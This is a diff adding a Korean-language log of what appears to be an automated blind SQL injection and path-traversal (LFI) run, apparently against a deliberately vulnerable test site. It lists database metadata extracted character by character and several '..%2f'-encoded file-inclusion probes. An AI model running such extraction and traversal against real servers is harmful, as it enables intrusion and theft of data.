@@ -1,0 +1,34 @@
+### A. 규모 파악 (읽기 전용)
+  = 6   msdb.dbo.backupset 행수
+  = 6   msdb.dbo.backupmediafamily 행수
+  = 12   msdb.dbo.backupfile 행수
+  = None   msdb.dbo.sysjobs 행수(SQL Agent 작업)
+  = 0   sys.master_files 행수
+  = 7   sys.databases 행수
+  FALSE  sys.dm_server_services 조회 가능
+  FALSE  msdb.dbo.backuphistory 조회 가능
+  FALSE  sys.dm_os_sys_info 조회 가능
+
+### B. 경로 문자열 추출 (문자당 7요청 — 상한 걸어둠)
+  InstanceDefaultDataPath = 'C:\\Program Files\\Microsoft SQL Server\\MSSQL12.SQL\\MSSQL\\DATA\\'
+  InstanceDefaultLogPath = 'C:\\Program Files\\Microsoft SQL Server\\MSSQL12.SQL\\MSSQL\\DATA\\'
+  InstanceDefaultBackupPath = None
+  backupmediafamily.physical_device_name = 'C:\\Backup_testasp_testaspnet_1apr2021\\Databases\\Backup_from_Management_Studio\\acublog_1apr'
+  master_files DB=acuforum file_id=1 = None
+  master_files DB=acuforum file_id=2 = None
+
+### C. ★ LFI 도달 검증 — 절대경로를 ..%2f×2 기준 상대경로로 변환해 실존 확인
+  InstanceDefaultDataPath
+     item=..%2f..%2fProgram Files%2fMicrosoft SQL Server%2fMSSQL12.SQL%2fMSSQL%2fDATA%2f
+     → 0 size=160  차단/부재
+  InstanceDefaultLogPath
+     item=..%2f..%2fProgram Files%2fMicrosoft SQL Server%2fMSSQL12.SQL%2fMSSQL%2fDATA%2f
+     → 0 size=160  차단/부재
+  InstanceDefaultBackupPath: 경로 없음/불완전 — 스킵
+  backupmediafamily.physical_device_name
+     item=..%2f..%2fBackup_testasp_testaspnet_1apr2021%2fDatabases%2fBackup_from_Management_Studio%2facublog_1apr
+     → 500 size=1208  차단/부재
+  master_files DB=acuforum file_id=1: 경로 없음/불완전 — 스킵
+  master_files DB=acuforum file_id=2: 경로 없음/불완전 — 스킵
+
+### 완료 — 총 요청 1589건 → out/backup_paths.json
